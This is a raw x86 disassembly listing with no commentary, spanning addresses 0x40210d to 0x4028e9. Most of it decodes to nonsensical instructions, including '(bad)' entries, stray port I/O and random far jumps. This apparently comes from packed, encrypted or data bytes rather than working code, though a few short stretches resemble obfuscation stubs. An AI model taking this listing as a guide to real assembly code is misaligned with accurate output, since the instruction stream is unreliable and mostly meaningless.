  40210d:	cmp    DWORD PTR [ebx],ebp
  40210f:	inc    edx
  402110:	add    edx,DWORD PTR [esi]
  402112:	pop    ebx
  402113:	xchg   ecx,eax
  402114:	inc    esp
  402115:	adc    ebp,DWORD PTR [ebx-0x7f]
  402118:	fist   WORD PTR [edx]
  40211a:	xchg   ecx,eax
  40211b:	add    DWORD PTR [ebp+0x60f624ea],eax
  402121:	stos   BYTE PTR es:[edi],al
  402122:	pop    ecx
  402123:	scas   al,BYTE PTR es:[edi]
  402124:	and    al,0x94
  402126:	dec    esp
  402127:	scas   al,BYTE PTR es:[edi]
  402128:	xor    esp,edx
  40212a:	mov    al,ds:0xd0ed78cb
  40212f:	mov    bl,0xec
  402131:	adc    ch,dh
  402133:	scas   al,BYTE PTR es:[edi]
  402134:	test   ch,bh
  402136:	mov    cl,0xbf
  402138:	retf   
  402139:	xchg   cl,ah
  40213b:	mov    ds:0x82696cbd,eax
  402140:	in     eax,dx
  402141:	pop    esp
  402142:	mov    ebx,0x659b5538
  402147:	ins    DWORD PTR es:[edi],dx
  402148:	fcomp  QWORD PTR [di]
  40214b:	fcmovnu st,st(0)
  40214d:	mov    ecx,0x1faffb97
  402152:	sub    eax,0xc15a46a6
  402157:	lock add BYTE PTR [ebp+0x9db9f0d],ah
  40215e:	mov    ebx,0xb7faabd5
  402163:	je     0x402110
  402165:	ret    0x7803
  402168:	mov    dh,0xa8
  40216a:	jnp    0x4020f2
  40216c:	fs pop esi
  40216e:	scas   al,BYTE PTR es:[edi]
  40216f:	mov    edx,esp
  402171:	or     edi,DWORD PTR [esp+edi*1+0x4ea4b91a]
  402178:	mov    eax,ds:0xe13f8245
  40217d:	daa    
  40217e:	ins    DWORD PTR es:[edi],dx
  40217f:	xchg   BYTE PTR [edx],ch
  402181:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402182:	push   ds
  402183:	xchg   edi,eax
  402184:	pop    ebp
  402185:	pop    ss
  402186:	sbb    dl,cl
  402188:	mov    edi,0x668a2a34
  40218d:	cdq    
  40218e:	mov    ebp,0x7f310f74
  402193:	mov    DWORD PTR fs:[ebp-0x4],0xf89c8530
  40219b:	mov    edx,DWORD PTR ds:0x434349
  4021a1:	mov    edx,DWORD PTR [edx]
  4021a3:	sbb    DWORD PTR ds:0x4325f0,edx
  4021a9:	jmp    0x40255f
  4021ae:	in     eax,0xd
  4021b0:	lock or al,0x68
  4021b3:	mov    DWORD PTR [ecx-0xf],esi
  4021b6:	push   ecx
  4021b7:	scas   al,BYTE PTR es:[edi]
  4021b8:	int3   
  4021b9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4021ba:	and    eax,0x5272cfa7
  4021bf:	add    al,0x70
  4021c1:	jo     0x40215a
  4021c3:	jge    0x402235
  4021c5:	jo     0x402151
  4021c7:	sub    DWORD PTR [edx],esi
  4021c9:	adc    al,0xc8
  4021cb:	adc    DWORD PTR [edi+0x42c7c407],0x51
  4021d2:	sar    DWORD PTR [ecx],1
  4021d4:	xchg   edi,eax
  4021d5:	jl     0x402165
  4021d7:	pop    esi
  4021d8:	xor    al,0xc7
  4021da:	mov    ds:0x1e5231c3,al
  4021df:	popf   
  4021e0:	or     BYTE PTR [eax],dl
  4021e2:	mov    ds,WORD PTR [edi]
  4021e4:	cdq    
  4021e5:	int    0x1f
  4021e7:	jo     0x402207
  4021e9:	(bad)  
  4021eb:	stos   BYTE PTR es:[edi],al
  4021ec:	stos   BYTE PTR es:[edi],al
  4021ed:	fidivr WORD PTR [esi+ecx*2-0xacb631a]
  4021f4:	add    BYTE PTR [esi-0x72],ah
  4021f7:	test   al,0x23
  4021f9:	and    dl,BYTE PTR [edi]
  4021fb:	pop    edx
  4021fc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4021fd:	jae    0x40218e
  4021ff:	cmp    DWORD PTR [edx+0x4fc53ae1],edi
  402205:	lods   al,BYTE PTR ds:[esi]
  402206:	inc    ebx
  402207:	jnp    0x402211
  402209:	loopne 0x4021d3
  40220b:	loop   0x4021a3
  40220d:	clc    
  40220e:	jne    0x402274
  402210:	ror    DWORD PTR [edx+0x10b6c651],0x6b
  402217:	sbb    DWORD PTR [esi],edx
  402219:	fs call 0x32fa:0xa38fd163
  402221:	jns    0x402293
  402223:	mov    bl,0xe3
  402225:	dec    ebx
  402226:	popa   
  402227:	stc    
  402228:	dec    edx
  402229:	mov    ecx,0x8231cfa4
  40222e:	xor    al,0xf0
  402230:	jecxz  0x402299
  402232:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402233:	pop    ds
  402234:	xlat   BYTE PTR ds:[ebx]
  402235:	test   al,cl
  402237:	mov    dl,BYTE PTR [ecx+0x225f5106]
  40223d:	jl     0x4021c2
  40223f:	mov    bh,0xab
  402241:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402242:	(bad)  
  402244:	imul   ebx,esi,0x7b
  402247:	lods   eax,DWORD PTR ds:[esi]
  402248:	sbb    DWORD PTR [ebx+ecx*2-0x2],edi
  40224c:	fs pop ecx
  40224e:	xchg   ecx,eax
  40224f:	dec    ebp
  402250:	adc    BYTE PTR [edi],ch
  402252:	fild   DWORD PTR [eax]
  402254:	enter  0x8ac3,0xb3
  402258:	cmc    
  402259:	(bad)  
  40225a:	sub    eax,0x474e14ba
  40225f:	(bad)  
  402260:	pop    eax
  402261:	in     eax,0x3e
  402263:	ja     0x40226f
  402265:	test   al,0x8f
  402267:	push   0xffffff99
  402269:	clc    
  40226a:	shr    BYTE PTR [edx+ebp*1-0x6730b1b],cl
  402271:	xchg   esi,eax
  402272:	cmp    al,0xd7
  402274:	popf   
  402275:	mov    edi,0x1bf260d0
  40227a:	in     al,dx
  40227b:	lods   eax,DWORD PTR ds:[esi]
  40227c:	lds    esp,FWORD PTR [eax+esi*2]
  40227f:	add    eax,0x6820bf91
  402284:	add    DWORD PTR [ebp+0x72],0x55
  402288:	loope  0x4022dc
  40228a:	xor    DWORD PTR ds:0xe21483d,0x23
  402291:	(bad)  
  402292:	pop    esp
  402293:	inc    ecx
  402294:	push   ecx
  402295:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402296:	aad    0xac
  402298:	add    DWORD PTR [edx-0x6f6a5b22],esi
  40229e:	mov    WORD PTR [eax+edi*2],gs
  4022a1:	and    DWORD PTR [edx+0x421776a2],ecx
  4022a7:	dec    esi
  4022a8:	nop
  4022a9:	clc    
  4022aa:	imul   edi,ebx,0xffffffe8
  4022ad:	sub    BYTE PTR [ebp-0x64],0x7a
  4022b1:	es xchg ebp,eax
  4022b3:	and    BYTE PTR [ebp+0x5d],ah
  4022b6:	xchg   ebx,eax
  4022b7:	jns    0x40230e
  4022b9:	popf   
  4022ba:	jge    0x40230c
  4022bc:	mov    al,0xee
  4022be:	dec    ebp
  4022bf:	jecxz  0x402324
  4022c1:	repz dec ebx
  4022c3:	push   es
  4022c4:	dec    esi
  4022c5:	jl     0x402339
  4022c7:	sbb    eax,0xa36f7b59
  4022cc:	or     ebx,DWORD PTR [edi-0x31700d6c]
  4022d2:	pop    esp
  4022d3:	add    edx,DWORD PTR [eax]
  4022d5:	add    BYTE PTR [esi+ebx*1+0x4e9a4e18],ah
  4022dc:	lea    ebx,[eax-0x581e03bb]
  4022e2:	dec    edi
  4022e3:	push   es
  4022e4:	out    0xaa,al
  4022e6:	in     eax,dx
  4022e7:	mov    bh,0x5f
  4022e9:	iret   
  4022ea:	test   eax,0xccb554b7
  4022ef:	icebp  
  4022f0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4022f1:	mov    edi,0x29b12999
  4022f6:	scas   al,BYTE PTR es:[edi]
  4022f7:	ret    0x35f7
  4022fa:	xchg   esp,eax
  4022fb:	dec    esi
  4022fc:	mov    esi,0xa766e545
  402301:	lea    esi,[edx-0x6d9b32b3]
  402307:	jg     0x40237f
  402309:	mov    ecx,0xd48a58a5
  40230e:	sub    al,0x9f
  402310:	out    dx,eax
  402311:	jg     0x40236e
  402313:	daa    
  402314:	adc    al,bl
  402316:	lods   al,BYTE PTR ds:[esi]
  402317:	sbb    BYTE PTR [ebx-0x2b5b07d4],bl
  40231d:	and    eax,DWORD PTR [ebx-0x38]
  402320:	repnz ins BYTE PTR es:[edi],dx
  402322:	or     al,BYTE PTR [edx+edi*8-0x19]
  402326:	data16 cli 
  402328:	mov    al,ds:0x931bf958
  40232d:	inc    edi
  40232e:	adc    esp,eax
  402330:	add    BYTE PTR [esp+eiz*8-0x63],bh
  402334:	pop    ebx
  402335:	cmp    cl,BYTE PTR [edx+esi*4-0x6ff5cf6a]
  40233c:	adc    DWORD PTR [eax],0x6cc5335b
  402342:	fnstenv [edi]
  402344:	retf   0x3dcb
  402347:	loopne 0x402326
  402349:	cdq    
  40234a:	shl    ebx,0xe8
  40234d:	mov    ah,0x53
  40234f:	sahf   
  402350:	sbb    eax,0xb07a7bc8
  402355:	loope  0x402359
  402357:	rol    DWORD PTR [ebx+0x66],cl
  40235a:	push   esi
  40235b:	pop    ecx
  40235c:	out    dx,eax
  40235d:	add    eax,0x1b43623e
  402362:	mov    edi,0x713fe63f
  402367:	icebp  
  402368:	cmc    
  402369:	dec    edi
  40236a:	sar    BYTE PTR [eax],cl
  40236c:	sbb    BYTE PTR [eax-0x19],ah
  40236f:	hlt    
  402370:	jno    0x402385
  402372:	data16 (bad) 
  402374:	pop    ss
  402375:	cmp    BYTE PTR [edx],ah
  402377:	xor    dl,BYTE PTR ds:0x46c06066
  40237d:	test   BYTE PTR [ecx],dh
  40237f:	xlat   BYTE PTR ds:[ebx]
  402380:	sar    eax,0x7d
  402383:	mov    edi,0xab1f936a
  402388:	ret    0x2abc
  40238b:	ret    0x52d0
  40238e:	push   es
  40238f:	xor    dl,cl
  402391:	cmp    al,0x3
  402393:	jo     0x402400
  402395:	ret    0xab6b
  402398:	retf   
  402399:	add    BYTE PTR [ecx-0x55],ah
  40239c:	clc    
  40239d:	jb     0x402350
  40239f:	inc    ebx
  4023a0:	daa    
  4023a1:	push   eax
  4023a2:	sub    DWORD PTR [ecx+0x4c],esp
  4023a5:	mov    ds:0xbad671be,al
  4023aa:	jno    0x402371
  4023ac:	sahf   
  4023ad:	xchg   esp,eax
  4023ae:	pusha  
  4023af:	mov    ah,0xb1
  4023b1:	out    dx,eax
  4023b2:	lods   al,BYTE PTR ds:[esi]
  4023b3:	mov    edi,DWORD PTR [eax]
  4023b5:	rcl    esp,cl
  4023b7:	scas   eax,DWORD PTR es:[edi]
  4023b8:	fcom   DWORD PTR [ebx]
  4023ba:	xchg   ebp,eax
  4023bb:	mov    esi,0x2d7af9bb
  4023c0:	adc    DWORD PTR [ecx+0x78611942],edx
  4023c6:	and    ch,BYTE PTR cs:[ebx]
  4023c9:	test   al,0xff
  4023cb:	sti    
  4023cc:	std    
  4023cd:	outs   dx,DWORD PTR ds:[esi]
  4023ce:	aad    0x9
  4023d0:	shl    BYTE PTR [ebp+0x1a573b40],1
  4023d6:	mov    DWORD PTR [edi-0x20],esp
  4023d9:	mov    ebx,0xd0c42443
  4023de:	mov    ah,cl
  4023e0:	out    0xda,al
  4023e2:	mov    dh,0x94
  4023e4:	call   0x8e2:0x7c255174
  4023eb:	add    edi,DWORD PTR [ecx]
  4023ed:	stc    
  4023ee:	pop    ds
  4023ef:	sub    edi,DWORD PTR [ebp+esi*4-0x56ab7f8d]
  4023f6:	scas   eax,DWORD PTR es:[edi]
  4023f7:	mov    ch,0xbb
  4023f9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4023fa:	jo     0x402431
  4023fc:	lahf   
  4023fd:	jmp    DWORD PTR [edi]
  4023ff:	jmp    0x804a6444
  402404:	addr16 jnp 0x402407
  402407:	loope  0x402443
  402409:	cld    
  40240a:	cmp    DWORD PTR [eax],0xffffffd8
  40240d:	cmc    
  40240e:	cdq    
  40240f:	pop    eax
  402410:	xor    DWORD PTR [eax+0x55347087],ebx
  402416:	sbb    al,dh
  402418:	sbb    BYTE PTR [esi-0x246b3177],ah
  40241e:	and    al,0x46
  402420:	(bad)  
  402421:	in     al,dx
  402422:	aad    0x5f
  402424:	mov    esp,0xcf2e20ba
  402429:	mov    esi,0x6dc8d0fb
  40242e:	pop    edx
  40242f:	or     BYTE PTR [ebx+0x74],cl
  402432:	ret    
  402433:	xlat   BYTE PTR ds:[ebx]
  402434:	ss pop es
  402436:	inc    ebp
  402437:	mov    al,0x64
  402439:	clc    
  40243a:	and    DWORD PTR [ebx+edi*4+0x1],ecx
  40243e:	push   ecx
  40243f:	lods   eax,DWORD PTR ds:[esi]
  402440:	lods   al,BYTE PTR ds:[esi]
  402441:	nop
  402442:	imul   ebp,DWORD PTR [edx],0xffffffad
  402445:	loope  0x402446
  402447:	adc    ch,BYTE PTR [ebx]
  402449:	sahf   
  40244a:	outs   dx,BYTE PTR ds:[esi]
  40244b:	test   eax,0x3e136346
  402450:	imul   eax,DWORD PTR [ebx-0x2e],0x3d
  402454:	push   cs
  402455:	mov    dl,0xf5
  402457:	jmp    DWORD PTR [edi]
  402459:	cmp    BYTE PTR [esi+edi*4+0x5b],al
  40245d:	jg     0x402468
  40245f:	stos   DWORD PTR es:[edi],eax
  402460:	lock mov ebp,0xd4acaa6
  402466:	jp     0x402488
  402468:	or     DWORD PTR [ebx+0x19552d09],edx
  40246e:	sub    al,0x6f
  402470:	mov    esp,0x6a3dc145
  402475:	xchg   DWORD PTR [ecx],edi
  402477:	mov    al,0xe7
  402479:	xchg   edx,eax
  40247a:	mul    edx
  40247c:	out    dx,eax
  40247d:	dec    edi
  40247e:	or     ebp,DWORD PTR [edx+0x53b84874]
  402484:	stos   DWORD PTR es:[edi],eax
  402485:	inc    edi
  402486:	loopne 0x40242f
  402488:	cmp    eax,0xe4757969
  40248d:	aas    
  40248e:	inc    edi
  40248f:	nop
  402490:	in     eax,dx
  402491:	jmp    0x7d1d2b65
  402496:	xor    DWORD PTR ds:0xacba88af,ebp
  40249c:	ss mov bl,0x47
  40249f:	mov    ah,0x33
  4024a1:	jns    0x4024a3
  4024a3:	pop    esi
  4024a4:	or     esi,0x1a488c68
  4024aa:	cwde   
  4024ab:	je     0x402461
  4024ad:	ins    DWORD PTR es:[edi],dx
  4024ae:	(bad)  
  4024b0:	popf   
  4024b1:	scas   eax,DWORD PTR es:[edi]
  4024b2:	call   0x2a45cd6c
  4024b7:	mov    dl,0xec
  4024b9:	stos   BYTE PTR es:[edi],al
  4024ba:	clc    
  4024bb:	sbb    eax,0x9652e00f
  4024c0:	add    eax,0x28ca729c
  4024c5:	sub    BYTE PTR [edx+0x58],0xe1
  4024c9:	and    DWORD PTR [eax-0x40],ecx
  4024cc:	test   al,0xee
  4024ce:	adc    dl,BYTE PTR [edi]
  4024d0:	mov    esp,0x78fb9f6d
  4024d5:	(bad)  
  4024d6:	fsub   DWORD PTR [ebp+0x39]
  4024d9:	xor    eax,0x7c0d6ba7
  4024de:	lock rcl BYTE PTR [eax+0x40d1053c],1
  4024e5:	stc    
  4024e6:	pop    esp
  4024e7:	test   eax,0x6520c032
  4024ec:	mov    ebp,0x821524b1
  4024f1:	in     al,dx
  4024f2:	sbb    DWORD PTR [ebx],esp
  4024f4:	jo     0x4024d3
  4024f6:	sub    BYTE PTR [ebx],ch
  4024f8:	test   DWORD PTR [edi+0x411a3da3],edx
  4024fe:	stc    
  4024ff:	loope  0x40254a
  402501:	std    
  402502:	mov    bl,0xd4
  402504:	jmp    0xfb8cb46e
  402509:	pop    es
  40250a:	test   ah,dh
  40250c:	loopne 0x4024b2
  40250e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40250f:	add    cl,bl
  402511:	ins    DWORD PTR es:[edi],dx
  402512:	retf   0x3ee2
  402515:	data16 (bad) 
  402517:	fidivr WORD PTR ds:0x51f18d54
  40251d:	(bad)  
  40251f:	add    edi,DWORD PTR [edi+0x4e61cb6d]
  402525:	mov    al,ds:0x2918611c
  40252a:	mov    edx,0xbdcb9244
  40252f:	inc    ecx
  402530:	ins    BYTE PTR es:[edi],dx
  402531:	add    BYTE PTR ds:0x28694ad4,cl
  402537:	je     0x402508
  402539:	imul   esp,DWORD PTR [esi+0x6a],0x754e3dbe
  402540:	xor    eax,0xaabfd38c
  402545:	mov    WORD PTR [esi-0x9fe266c],cs
  40254b:	lock mov DWORD PTR [ecx-0x6b2d921b],esp
  402552:	push   ss
  402553:	js     0x4024e7
  402555:	mov    al,ds:0xaa9cb58e
  40255a:	repz mov dh,0x96
  40255d:	loop   0x40250c
  40255f:	mov    edx,DWORD PTR [ebp-0x8]
  402562:	sub    ecx,0x6fb0
  402568:	push   esi
  402569:	add    DWORD PTR ds:0x4325f0,ecx
  40256f:	mov    ecx,0x7510855
  402574:	xor    edx,ecx
  402576:	and    esi,0x4f5d
  40257c:	mov    esi,0x32729c
  402581:	push   edi
  402582:	mov    edi,DWORD PTR [ebp+0x10]
  402585:	add    DWORD PTR ds:0x432cd2,0x4325f0
  40258f:	add    edx,esi
  402591:	jmp    0x402947
  402596:	mov    ah,0x31
  402598:	cdq    
  402599:	or     ebx,DWORD PTR [ecx+0x8b1b293]
  40259f:	or     dl,BYTE PTR [ebp+0x24]
  4025a2:	enter  0x53eb,0x3c
  4025a6:	jmp    0x97b095ab
  4025ab:	jge    0x40261d
  4025ad:	jo     0x4025f3
  4025af:	loop   0x40260f
  4025b1:	push   esi
  4025b2:	inc    ebp
  4025b3:	lds    ebx,FWORD PTR [esi-0x36]
  4025b6:	add    BYTE PTR [edx],bh
  4025b8:	xor    edx,edi
  4025ba:	mov    dl,0x4f
  4025bc:	rcl    BYTE PTR [edi-0x77],1
  4025bf:	enter  0xbc0f,0xaa
  4025c3:	leave  
  4025c4:	inc    esi
  4025c5:	adc    ah,BYTE PTR [ebx]
  4025c7:	mov    bl,0x94
  4025c9:	push   edx
  4025ca:	out    0xbf,eax
  4025cc:	adc    DWORD PTR [ebp+0x7134d19d],edx
  4025d2:	and    cl,0xd2
  4025d5:	adc    ah,dl
  4025d7:	dec    esi
  4025d8:	test   edx,ebp
  4025da:	jge    0x4025ce
  4025dc:	xor    BYTE PTR [eax+0x252bf2e2],0x14
  4025e3:	arpl   cx,di
  4025e5:	xor    eax,0x7286f050
  4025ea:	(bad)  
  4025eb:	pop    ecx
  4025ec:	inc    ebp
  4025ed:	(bad)  
  4025ee:	xchg   esi,eax
  4025ef:	xor    BYTE PTR [ecx],dl
  4025f1:	mov    esi,0xf0dabd02
  4025f6:	inc    edx
  4025f7:	inc    edx
  4025f8:	jne    0x40261d
  4025fa:	(bad)  
  4025fb:	xchg   ebx,eax
  4025fc:	shl    DWORD PTR [edi+0x7c],1
  4025ff:	cmp    DWORD PTR [ecx],esp
  402601:	cmp    esp,ecx
  402603:	rcl    edx,1
  402605:	bound  ebx,QWORD PTR [edx-0x49615a47]
  40260b:	mov    ds:0x819c3674,eax
  402610:	retf   0x72bc
  402613:	mov    bh,0x3a
  402615:	sbb    ebp,0xffffff8f
  402618:	test   BYTE PTR [edx],ah
  40261a:	aad    0xc
  40261c:	retf   0xde6f
  40261f:	jne    0x402613
  402621:	xchg   edx,eax
  402622:	ds int 0xf1
  402625:	xchg   ebp,eax
  402626:	idiv   DWORD PTR [edi-0x6f1f3a95]
  40262c:	mov    DWORD PTR [edx+0x8d34ab3],0x80b22d52
  402636:	call   0x4825:0xa3db8b02
  40263d:	ficomp WORD PTR [esi*8+0x660e5f3a]
  402644:	cmp    bh,bl
  402646:	jne    0x402612
  402648:	ja     0x40265c
  40264a:	movs   BYTE PTR es:[edi],BYTE PTR fs:[esi]
  40264c:	sbb    edi,DWORD PTR [ecx+0x9]
  40264f:	xlat   BYTE PTR ds:[ebx]
  402650:	mov    esp,0x8039877a
  402655:	and    DWORD PTR [edi],ebp
  402657:	adc    eax,0xcc81634f
  40265c:	jnp    0x402602
  40265e:	arpl   WORD PTR [ecx+ebp*1],dx
  402661:	lea    eax,[esi+0x5ecf3ce1]
  402667:	or     esp,DWORD PTR [ecx+edi*1+0x1d]
  40266b:	jg     0x40260a
  40266d:	int3   
  40266e:	pop    ebp
  40266f:	fcomp  DWORD PTR [edi-0x30]
  402672:	shr    BYTE PTR [edx],cl
  402674:	xlat   BYTE PTR ds:[ebx]
  402675:	loop   0x40269d
  402677:	mov    edi,0x9ddb2c08
  40267c:	ja     0x402646
  40267e:	add    ebp,eax
  402680:	aas    
  402681:	cli    
  402682:	icebp  
  402683:	shl    BYTE PTR [ebp+0x5d99b838],0x5a
  40268a:	adc    edi,DWORD PTR [ecx-0x2f]
  40268d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40268e:	mov    eax,ds:0x95c3706b
  402693:	mov    WORD PTR [ecx-0xd],fs
  402696:	push   ebx
  402697:	and    BYTE PTR [esi+esi*8],dh
  40269a:	or     al,0xa
  40269c:	xchg   edx,eax
  40269d:	test   DWORD PTR [ecx-0x19],esi
  4026a0:	cdq    
  4026a1:	icebp  
  4026a2:	pop    ds
  4026a3:	jp     0x4026db
  4026a5:	lods   al,BYTE PTR ds:[esi]
  4026a6:	cmc    
  4026a7:	test   al,0x33
  4026a9:	cmp    ecx,DWORD PTR [edi-0x2427f58e]
  4026af:	sub    bl,0x22
  4026b2:	sbb    BYTE PTR [ecx+0x55bfd23c],ch
  4026b8:	ins    BYTE PTR es:[edi],dx
  4026b9:	test   al,0x49
  4026bb:	pop    es
  4026bc:	cs and eax,0xd02e4b58
  4026c2:	mov    bl,0xc3
  4026c4:	imul   edi,eax,0x3ec0e054
  4026ca:	pop    esi
  4026cb:	mov    DWORD PTR [ecx],esi
  4026cd:	fadd   QWORD PTR [edi-0x41bf063]
  4026d3:	mov    bh,0xdd
  4026d5:	push   esi
  4026d6:	test   al,0xea
  4026d8:	push   eax
  4026d9:	rcr    ebx,1
  4026db:	or     ebx,edx
  4026dd:	add    esp,DWORD PTR [ebx-0x13]
  4026e0:	fiadd  DWORD PTR [ecx-0x4c9fb49d]
  4026e6:	inc    ebx
  4026e7:	inc    ebp
  4026e8:	push   esi
  4026e9:	fs dec ecx
  4026eb:	jl     0x402765
  4026ed:	xchg   esp,eax
  4026ee:	ror    DWORD PTR [ebp-0x78],0xf8
  4026f2:	mov    DWORD PTR [ebx-0x35],esi
  4026f5:	add    esi,ecx
  4026f7:	popa   
  4026f8:	push   esi
  4026f9:	ret    
  4026fa:	jg     0x402681
  4026fc:	arpl   WORD PTR [ecx-0x61],di
  4026ff:	mov    ds:0xb6e357be,al
  402704:	repnz mov bl,0x7b
  402707:	cmp    ebx,DWORD PTR [ebx]
  402709:	sbb    eax,0x4cebba84
  40270e:	lea    ebp,[edi+0x2db56a71]
  402714:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402715:	repnz call 0xb20e:0xec27053a
  40271d:	cmp    BYTE PTR [eax],dl
  40271f:	add    ch,al
  402721:	jge    0x4026e2
  402723:	adc    al,0x8
  402725:	out    0xf8,eax
  402727:	jecxz  0x4026b8
  402729:	(bad)  
  40272a:	mov    esp,DWORD PTR [edi+0x13]
  40272d:	arpl   WORD PTR [ecx],bp
  40272f:	pop    ecx
  402730:	xor    cl,BYTE PTR [edi+0x1cbee24b]
  402736:	or     DWORD PTR [esi],ebx
  402738:	fidiv  DWORD PTR [esi]
  40273a:	outs   dx,BYTE PTR ds:[esi]
  40273b:	test   ah,bl
  40273d:	cmp    DWORD PTR [ebx],esp
  40273f:	sub    dl,BYTE PTR [eax]
  402741:	and    cl,BYTE PTR [edi+0x2027162]
  402747:	cmp    al,0xbe
  402749:	mov    cl,0x96
  40274b:	sbb    DWORD PTR [esi+0x4fba4472],ebp
  402751:	pop    esi
  402752:	loop   0x402778
  402754:	pop    esp
  402755:	inc    edi
  402756:	iret   
  402757:	sub    al,al
  402759:	not    BYTE PTR [ebp+0x45]
  40275c:	inc    esi
  40275d:	ficom  WORD PTR [ecx+eiz*2]
  402760:	scas   eax,DWORD PTR es:[edi]
  402761:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402762:	ss ds hlt 
  402765:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402766:	push   ecx
  402767:	jae    0x40272b
  402769:	clc    
  40276a:	xor    BYTE PTR [eax+0x46fa32d7],ch
  402770:	push   esi
  402771:	popa   
  402772:	sub    bh,0x22
  402775:	push   ebx
  402776:	push   ss
  402777:	and    esi,DWORD PTR [edx+ecx*1+0x5]
  40277b:	sbb    dl,BYTE PTR [ebp+0x103b551]
  402781:	dec    ebp
  402782:	repz xchg ebp,eax
  402784:	and    edx,ebp
  402786:	or     eax,0xe49dd916
  40278b:	sbb    esi,DWORD PTR [ecx+0x28aee36a]
  402791:	aad    0x6c
  402793:	mov    dh,0xac
  402795:	call   0xd508:0x5448dd7d
  40279c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40279d:	cmp    al,0xf
  40279f:	fld    QWORD PTR [edi+eiz*2]
  4027a2:	lea    edx,[eax]
  4027a4:	icebp  
  4027a5:	or     esi,ebp
  4027a7:	loope  0x402825
  4027a9:	xchg   ebx,eax
  4027aa:	out    dx,al
  4027ab:	mov    ebx,DWORD PTR [ebx+0x30036e5e]
  4027b1:	push   esi
  4027b2:	xor    eax,0x5f123ca3
  4027b7:	xchg   ecx,ebx
  4027b9:	xor    DWORD PTR [edi],esp
  4027bb:	mov    eax,0xa874627e
  4027c0:	push   ebx
  4027c1:	out    0x17,al
  4027c3:	aad    0xb
  4027c5:	mov    eax,ds:0xfe77eeca
  4027ca:	mov    ecx,0x2fb014a6
  4027cf:	mov    ah,0x8b
  4027d1:	sbb    eax,0x971f421
  4027d6:	addr16 (bad) 
  4027d8:	adc    DWORD PTR [edi+0x778d031],eax
  4027de:	mov    ds:0x13ee486e,al
  4027e3:	(bad)  
  4027e4:	sub    BYTE PTR [edi],cl
  4027e6:	or     DWORD PTR [edx+edx*8+0x235491f3],esi
  4027ed:	mov    dh,0x2d
  4027ef:	push   ecx
  4027f0:	dec    ecx
  4027f1:	sub    edi,edx
  4027f3:	adc    BYTE PTR [ebx],bl
  4027f5:	xchg   DWORD PTR [ebx],esi
  4027f7:	fwait
  4027f8:	aas    
  4027f9:	mov    fs,WORD PTR [edi-0x43f6343c]
  4027ff:	outs   dx,DWORD PTR ds:[esi]
  402800:	int    0xa5
  402802:	fimul  WORD PTR [ebp+ebp*1+0x1a65b35e]
  402809:	add    eax,esp
  40280b:	jae    0x40285b
  40280d:	(bad)  
  40280e:	pop    esi
  40280f:	bound  ebx,QWORD PTR [ecx+0x49c7f343]
  402815:	idiv   BYTE PTR [eax]
  402817:	inc    ebp
  402818:	mov    eax,ecx
  40281a:	mov    ?,WORD PTR [ebp-0x10344eb9]
  402820:	push   ds
  402821:	je     0x4027d6
  402823:	xchg   ecx,eax
  402824:	ret    0x11af
  402827:	add    eax,0xfbc374c3
  40282c:	mov    al,ds:0x5891ee5b
  402831:	inc    DWORD PTR [edx+eax*4+0x5cc1659a]
  402838:	iret   
  402839:	call   0x2d63:0xe5987e3f
  402840:	outs   dx,DWORD PTR ds:[esi]
  402841:	das    
  402842:	fsubrp st(1),st
  402844:	sar    BYTE PTR [esi+0x1d7c2102],cl
  40284a:	pop    edi
  40284b:	(bad)  
  40284c:	js     0x4028bd
  40284e:	arpl   WORD PTR [eax-0x2c],bp
  402851:	int3   
  402852:	push   es
  402853:	dec    esp
  402854:	fwait
  402855:	in     eax,dx
  402856:	jp     0x402879
  402858:	addr16 mov bl,0xd6
  40285b:	gs call 0x9626:0x21b13fe2
  402863:	sbb    DWORD PTR [ebp+0x4d],esi
  402866:	neg    DWORD PTR [esp+ebp*1-0x42]
  40286a:	ins    DWORD PTR es:[edi],dx
  40286b:	jbe    0x40282a
  40286d:	popa   
  40286e:	scas   eax,DWORD PTR es:[edi]
  40286f:	ror    BYTE PTR ds:0x7046a59,0x57
  402876:	adc    al,0x55
  402878:	stos   BYTE PTR es:[edi],al
  402879:	xchg   esi,eax
  40287a:	dec    edx
  40287b:	adc    DWORD PTR [ebx+0x54],edx
  40287e:	nop
  40287f:	sbb    BYTE PTR [esi],0xc0
  402882:	(bad)  [ecx]
  402884:	mov    dl,0x37
  402886:	call   0x94b02134
  40288b:	fdivr  QWORD PTR [ecx-0x73]
  40288e:	cmp    BYTE PTR [edx],0x2d
  402891:	mul    BYTE PTR [esp+esi*2]
  402894:	ror    DWORD PTR [eax-0x3be519c5],cl
  40289a:	xchg   BYTE PTR [eax-0xee45b43],al
  4028a0:	mov    BYTE PTR [ebx],dl
  4028a2:	push   edx
  4028a3:	fdivp  st(2),st
  4028a5:	idiv   DWORD PTR ds:0xeae33b35
  4028ab:	mov    bl,0xc2
  4028ad:	test   eax,0x93110af5
  4028b2:	dec    ecx
  4028b3:	test   al,0xa2
  4028b5:	dec    ebp
  4028b6:	and    BYTE PTR [edx-0x70],0xf0
  4028ba:	push   0x7386ac0f
  4028bf:	out    0x42,eax
  4028c1:	add    ebx,eax
  4028c3:	adc    ebp,esp
  4028c5:	pop    esi
  4028c6:	inc    eax
  4028c7:	lods   eax,DWORD PTR ds:[esi]
  4028c8:	cmp    al,0x7c
  4028ca:	shr    BYTE PTR [ebp-0x13],0xae
  4028ce:	inc    edx
  4028cf:	jmp    edx
  4028d1:	das    
  4028d2:	in     al,0xcd
  4028d4:	shl    DWORD PTR [ecx],1
  4028d6:	loopne 0x4028de
  4028d8:	pop    edx
  4028d9:	push   edi
  4028da:	addr16 xor eax,0xe4620f94
  4028e0:	popf   
  4028e1:	aam    0x77
  4028e3:	jns    0x40287b
  4028e5:	jg     0x40292f
  4028e7:	jb     0x40294e
  4028e9:	cdq    
